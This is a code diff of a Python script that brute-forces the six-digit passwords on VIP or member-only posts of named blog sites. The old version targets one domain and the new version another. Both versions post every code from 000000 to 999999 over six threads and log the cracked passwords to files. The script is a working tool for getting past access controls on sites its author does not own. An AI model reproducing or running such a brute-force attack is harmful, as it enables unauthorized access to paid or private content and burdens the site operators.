@@ -1,86 +1,75 @@
-# pyinstaller -F D:\aRooba\documents\code\网络脚本\kongBlog\kongBlog.py --icon ..\icon.ico
 import requests
 import traceback
 import threading
 import time
-from bs4 import BeautifulSoup
 
 
 def getPassword(idx):
-    # global proxy_list
-    print(threading.current_thread().getName())
-    while True:
-        url = 'http://guga.angmiweb.net.cn/post/' + str(pageNum[i]) + '.html'
-        # proxy = {'http': 'http://218.14.115.211:3128'}
-        print('正在安排' + url)
-        try:
-            res = requests.get(url) # get，看该网页是不是vip
-            res.raise_for_status()
-            titleLine = res.text.split('\n')[6]
-        except:
-            print(str(pageNum[i]) + '\t404')
-            print(traceback.format_exc())
-            pageNum[i] += 6
-            if pageNum[i] > 600:
-                print(threading.current_thread().getName() + '已结束')
-            continue
-        print(titleLine.replace('<title>', '').replace('</title>', ''))
-        if 'VIP' in titleLine or '会员' in titleLine:
-            print('is VIP')
-            found = False
-            while startFrom[i] < 1000000:  # 穷举六位数字密码
-                password = str(startFrom[i]).rjust(6, '0')
-                data = {'password': password, 'submit': '查看'}
-                try:
-                    res = requests.post(url, data=data)
-                    res.raise_for_status()
-                    if res.text.startswith('<!') and '欢迎登录北邮校园网络' not in res.text:
-                        with open('review.txt', 'a') as f:
-                            f.write('\n\n\n\n' + password + '\n' + res.text)
-                        print(threading.current_thread().getName() + '——' + str(startFrom[i]) + ': RIGHT!!!!!!!!!!!!!!!!!')
-                        print(str(pageNum[i]) + '\tOK')
-                        found = True
-                        break
-                    else:
-                        print(threading.current_thread().getName() + '——' + str(startFrom[i]) + ': Wrong')
-                except:
-                    print(traceback.format_exc())
-                    print(threading.current_thread().getName() + '——' + str(startFrom[i]) + '\t有误，URL为' + url)
-                    startFrom[i] -= 1
-                startFrom[i] += 1
-            with open('password.txt', 'a') as f:
-                if not found:
-                    f.write(url + '\t找不到密码\n')
-                else:
-                    f.write(url + '\t' + password + '\n')
-            startFrom[i] = 0
-        else:
-            print('is not VIP')
+    print(threading.current_thread().getName() + ' start')
 
-        pageNum[i] += 6
-        if pageNum[i] > 600:
-            print(threading.current_thread().getName() + '已结束')
-            break
+    while True:
+        url = 'https://findlifee.com/post/%d.html' % pageNum[idx]
+        while url not in urlList:
+            pageNum[idx] += 6
+            url = 'https://findlifee.com/post/%d.html' % pageNum[idx]
+        print('%s is working on %d' % (threading.current_thread().getName(), pageNum[idx]))
+        found = False
+        while startFrom[idx] < 1000000:
+            password = str(startFrom[idx]).rjust(6, '0')
+            data = {'password': password, 'submit': '查看'}
+            try:
+                res = requests.post(url, data=data)
+                res.raise_for_status()
+                if len(res.text) < 300:
+                    print('%s--%d: Wrong' % (threading.current_thread().getName(), startFrom[idx]))
+                else:
+                    print('%s--%d: RIGHT!!!!!!!!!!!!!!!!!' % (threading.current_thread().getName(), startFrom[idx]))
+                    print('%d\tOK' % pageNum[idx])
+                    found = True
+                    break
+            except:
+                print(traceback.format_exc())
+                print('%s--%d\texception, url: %s' % (threading.current_thread().getName(), startFrom[idx], url))
+                startFrom[idx] -= 1
+            startFrom[idx] += 1
+        with open('password.txt', 'a') as f:
+            if not found:
+                f.write('%s\tno password\n' % url)
+            else:
+                f.write('%s\t%s\n' % (url, password))
+        with open('UrlCollection.txt', 'w') as f:
+            for u in urlList:
+                f.write(u + '\n')
+        urlList.remove(url)
+        startFrom[idx] = 0
+        pageNum[idx] += 6
 
 
 if __name__ == '__main__':
     pageNum = [0] * 6
     startFrom = [0] * 6
-    with open('D:\\aRooba\\documents\\code\\网络脚本\\kongBlog\\kongBlog_record.txt', 'r') as f:
-        for i, line in zip(range(6), f.readlines()):
+    urlList = []
+    with open('kongBlog_record.txt', 'r') as f:
+        for i, line in enumerate(f.readlines()):
             pageNum[i] = int(line.split(':')[0])
             startFrom[i] = int(line.split(':')[1])
-    with open('D:\\aRooba\\documents\\code\\网络脚本\\kongBlog\\kongBlog_record_backup.txt', 'w') as f:
+
+    with open('kongBlog_record_backup.txt', 'w') as f:
         for p, s in zip(pageNum, startFrom):
             f.write(str(p) + ':' + str(s) + '\n')
-    # with open('D:\\aRooba\\documents\\code\\网络脚本\\collection_ip.txt', 'r') as f:
-    #     for line in f.readlines():
-    #         proxy_list.append({'http://' + line.split(':')[0] : line.split(':')[0][:-1]})
+
+    with open('UrlCollection.txt', 'r') as f:
+        for line in f.readlines():
+            urlList.append(line[:-1])
+
+
     for i in range(6):
-        threading.Thread(target=getPassword, name='Thread-'+str(i+1), args=(i)).start()
+        threading.Thread(target=getPassword, name='Thread-'+str(i+1), args=(i,)).start()
 
     while True:
         time.sleep(60)
-        with open('D:\\aRooba\\documents\\code\\网络脚本\\kongBlog\\kongBlog_record.txt', 'w') as f:
-            for p, s in zip(pageNum, startFrom):
-                f.write(str(p) + ':' + str(s) + '\n')
+        recordList = []
+        for p, s in zip(pageNum, startFrom):
+            recordList.append('%d:%d' % (p, s))
+        with open('kongBlog_record.txt', 'w') as f:
+            f.write('\n'.join(recordList))
